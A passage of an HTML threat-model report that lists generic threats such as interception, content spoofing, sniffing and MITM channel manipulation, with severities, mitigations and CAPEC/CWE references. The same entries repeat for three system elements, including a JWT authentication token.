  <p>https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC05   --   Content Spoofing</summary>
  <h6> Targeted Element </h6>
  <p> Validate credentials </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker&#x27;s server.</p>
  <h6>Mitigations</h6>
  <p>Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE03   --   Sniffing Attacks</summary>
  <h6> Targeted Element </h6>
  <p> Validate credentials </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.</p>
  <h6>Mitigations</h6>
  <p>Encrypt sensitive information when transmitted on insecure mediums to prevent interception.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR06   --   Communication Channel Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Validate credentials </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.</p>
  <h6>Mitigations</h6>
  <p>Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/216.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR08   --   Client-Server Protocol Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Validate credentials </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.</p>
  <h6>Mitigations</h6>
  <p>Use strong authentication protocols.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE01   --   Interception</summary>
  <h6> Targeted Element </h6>
  <p> Return user record </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.</p>
  <h6>Mitigations</h6>
  <p>Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC05   --   Content Spoofing</summary>
  <h6> Targeted Element </h6>
  <p> Return user record </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker&#x27;s server.</p>
  <h6>Mitigations</h6>
  <p>Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE03   --   Sniffing Attacks</summary>
  <h6> Targeted Element </h6>
  <p> Return user record </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.</p>
  <h6>Mitigations</h6>
  <p>Encrypt sensitive information when transmitted on insecure mediums to prevent interception.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR06   --   Communication Channel Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Return user record </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.</p>
  <h6>Mitigations</h6>
  <p>Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/216.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR08   --   Client-Server Protocol Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Return user record </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.</p>
  <h6>Mitigations</h6>
  <p>Use strong authentication protocols.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE01   --   Interception</summary>
  <h6> Targeted Element </h6>
  <p> Authentication JWT Token </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.</p>
  <h6>Mitigations</h6>
  <p>Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC05   --   Content Spoofing</summary>
  <h6> Targeted Element </h6>
  <p> Authentication JWT Token </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker&#x27;s server.</p>
  <h6>Mitigations</h6>
  <p>Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE03   --   Sniffing Attacks</summary>
  <h6> Targeted Element </h6>
  <p> Authentication JWT Token </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.</p>
  <h6>Mitigations</h6>
  <p>Encrypt sensitive information when transmitted on insecure mediums to prevent interception.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR06   --   Communication Channel Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Authentication JWT Token </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.</p>
  <h6>Mitigations</h6>
  <p>Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/216.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR08   --   Client-Server Protocol Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Authentication JWT Token </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.</p>
  <h6>Mitigations</h6>
  <p>Use strong authentication protocols.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>
|

